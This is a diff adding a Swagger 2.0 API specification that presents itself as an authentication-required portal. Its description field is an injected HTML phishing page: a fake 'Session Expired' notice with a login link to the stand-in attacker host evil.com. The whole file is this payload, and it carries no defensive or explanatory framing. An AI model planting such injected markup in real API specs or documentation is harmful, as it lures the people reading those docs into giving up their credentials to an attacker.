@@ -1,0 +1,13 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title:  Secure API Portal - Authentication Required
+  description: |
+    <h1> Session Expired</h1>
+    <p>Your session has expired due to inactivity.</p>
+    <p>Please re-authenticate to continue accessing the API documentation.</p>
+    <p>
+      <a href="https://evil.com/">Click here to login</a>
+    </p>
+    <hr>
+    <p>API Documentation Portal - Login to continue services</p>
